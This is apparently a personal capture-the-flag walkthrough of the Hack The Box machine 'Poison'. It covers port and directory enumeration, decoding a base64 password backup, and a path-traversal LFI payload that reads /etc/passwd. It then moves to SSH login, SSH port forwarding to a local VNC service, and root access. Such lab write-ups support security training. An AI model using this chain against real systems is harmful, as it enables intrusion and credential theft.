- ping machine
	- `ping 10.10.10.84`
	- machine is up
- autorecon 
```bash

```
- nmap for open ports
	- `nmap -p- -T4 --open -Pn -vvv ###.###.###.### -oN nameNmap.txt`
	- 22 
	- 80
```bash
┌──(kali㉿kali)-[~]
└─$ nmap -p- -T4 --open -Pn -vvv 10.10.10.84 -oN poisonNmap.txt
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-15 08:53 EST
Initiating SYN Stealth Scan at 08:53
Scanning poison.htb (10.10.10.84) [65535 ports]
Discovered open port 22/tcp on 10.10.10.84
Discovered open port 80/tcp on 10.10.10.84
Completed SYN Stealth Scan at 08:54, 52.95s elapsed (65535 total ports)
Nmap scan report for poison.htb (10.10.10.84)
Host is up, received user-set (0.061s latency).
Scanned at 2024-12-15 08:53:16 EST for 53s
Not shown: 54999 filtered tcp ports (no-response), 10534 closed tcp ports (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 53.01 seconds
           Raw packets sent: 127670 (5.617MB) | Rcvd: 20267 (2.786MB)
```
- nmap for services and versions running on open ports
	- `nmap -p port#, port#, port# -sC -sV ###.###.###.### -oN nameServicesVersionsNmap` 
	- 22 openssh 7.2
	- 80 Apache 2.4.29
```bash
┌──(kali㉿kali)-[~/htb/poison]
└─$ nmap -p 22,80 -sC -sV 10.10.10.84 -oN poisonServicesVersionsNmap    
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-15 09:06 EST
Nmap scan report for poison.htb (10.10.10.84)
Host is up (0.056s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2 (FreeBSD 20161230; protocol 2.0)
| ssh-hostkey: 
|   2048 e3:3b:7d:3c:8f:4b:8c:f9:cd:7f:d2:3a:ce:2d:ff:bb (RSA)
|   256 4c:e8:c6:02:bd:fc:83:ff:c9:80:01:54:7d:22:81:72 (ECDSA)
|_  256 0b:8f:d5:71:85:90:13:85:61:8b:eb:34:13:5f:94:3b (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((FreeBSD) PHP/5.6.32)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.29 (FreeBSD) PHP/5.6.32
Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.94 seconds

```
	- 
- Gobuster to enumerate website if machine has 80 or 443
	- `gobuster dir -u http://precious.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt -o nameGobuster.txt -t 10 -x  ??PHP, HTM, HTML, ASP, TXT, JS, CSS??` 
	- info.php
		- FreeBSD Poison 11.1-RELEASE FreeBSD 11.1-RELEASE #0 r321309: Fri Jul 21 02:08:28 UTC 2017 root@releng2.nyi.freebsd.org:/usr/obj/usr/src/sys/GENERIC amd64
	- 
- search for exploits, RCEs, etc on service's versions running on those open ports
	- SearchSploit
	- Metaspolit
	- document
- Foothold
	- sudo -l
- visiting 10.10.10.84:80
	- reveals temporary website to test local .php scripts
	- ![[Pasted image 20241222162527.png]]
	- submitting listfiles.php reveals pwdbackup.txt
	- ![[Pasted image 20241222162833.png]]
	- manually changing url and replacing listfiles.php with pwdbackup.txt reveals a password that's been encoded 13 times. The equal sign at the end is a dead giveaway that it's base64 encoded
	- ![[Pasted image 20241222163742.png]]
	- We can take this encoded text and base64 decode it 13 times and then we'll be left with actual password
	- We have to copy and past it into a text file to decode it. For this I just used vim. 
	- use base64 to decode it 13 times and we get Charix!2#4%6&8(0
	```bash
┌──(kali㉿kali)-[~/htb/poison]
└─$ cat poisonPasswd.txt | base64 -d | base64 -d | base64 -d | base64 -d  | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d
Charix!2#4%6&8(0
```
	- the `?file=pwdbackup.txt` is an indication that Local File Inclusion exist
	- testing LFI by removing backup.txt and replacing with ../../../../../../../../../../../etc/passwd. reveals the etc/passwd file with charix as a user. so we are assuming that this is Charix's passwd
	- ![[Pasted image 20241222172620.png]]
	```bash
	
```
	- Login in via ssh as charix / Charix!2#4%6&8(0
	- cat user.txt flag in home directory
	- secret.zip in home directory
	- running scp on kali machine, pulling secret from target machine
	```bash
┌──(kali㉿kali)-[~/htb]
└─$ scp charix@10.10.10.84:/home/charix/secret.zip ./secret.zip
```
	- unzip secret on kali machine
	```bash
┌──(kali㉿kali)-[~/htb/poison]
└─$ unzip secret.zip
Archive:  secret.zip
[secret.zip] secret password: 
 extracting: secret                  
                                                                                                                                          
┌──(kali㉿kali)-[~/htb/poison]
└─$ cat secret
��[|Ֆz!
```

- Using sockstat to search the target machine for processes listening locally
	- we find XVNC running on 5901 and 5801
```bash
charix@Poison:~ % sockstat -4 -l
USER     COMMAND    PID   FD PROTO  LOCAL ADDRESS         FOREIGN ADDRESS      
root     sendmail   642   3  tcp4   127.0.0.1:25          *:*
www      httpd      641   4  tcp4   *:80                  *:*
www      httpd      640   4  tcp4   *:80                  *:*
www      httpd      639   4  tcp4   *:80                  *:*
www      httpd      638   4  tcp4   *:80                  *:*
www      httpd      637   4  tcp4   *:80                  *:*
root     httpd      625   4  tcp4   *:80                  *:*
root     sshd       620   4  tcp4   *:22                  *:*
root     Xvnc       529   1  tcp4   127.0.0.1:5901        *:*
root     Xvnc       529   3  tcp4   127.0.0.1:5801        *:*
root     syslogd    390   7  udp4   *:514                 *:*

```

- Using ssh establish a local port forwarding tunnel
	- create a secure tunnel where traffic sent to local port on my attack machine is forwarded through ssh to remote port on the target machine
	- `ssh -L [local_port]:[remote_host]:[remote_port] [username]@[remote_host]`
```bash
──(kali㉿kali)-[~/htb/poison]
└─$ ssh -L 3000:127.0.0.1:5901 charix@10.10.10.84
(charix@10.10.10.84) Password for charix@Poison:
Last login: Sat Dec 28 19:16:28 2024 from 10.10.14.3
FreeBSD 11.1-RELEASE (GENERIC) #0 r321309: Fri Jul 21 02:08:28 UTC 2017
...
```
- what the above does
- Traffic directed to 127.0.0.1:3000 on my local machine is securely tunneled through ssh to 127.0.0.1:5901 on the remote machine (10.10.10.84)

- now we use vncviewer & pass the secret to log in as root
```bash
┌──(kali㉿kali)-[~]
└─$ vncviewer -passwd secret 127.0.0.1::3000  
```

- cp root.txt to charix and change the permissions for them to cat
- `cp /root/root.txt /home/charix/root.txt; chmod 777 /home/charix/root.txt`




















